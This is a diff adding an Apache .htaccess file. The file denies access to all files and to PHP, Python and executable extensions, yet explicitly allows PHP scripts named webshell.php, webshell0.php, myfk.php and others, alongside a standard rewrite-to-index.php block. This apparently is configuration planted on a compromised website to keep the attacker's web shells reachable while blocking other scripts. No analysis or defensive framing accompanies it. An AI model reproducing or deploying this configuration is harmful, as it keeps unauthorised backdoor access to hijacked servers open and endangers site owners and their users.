@@ -1,0 +1,27 @@
+<Files *>
+        Order deny,allow
+        
+        deny from all
+    </Files>
+    <Files index.php>
+        Order deny,allow
+        
+        allow from all
+    </Files>      
+<FilesMatch ".(py|exe|shtml|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|webshell.php|myfk.php|webshell0.php|find.php|admin.php|your.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+  
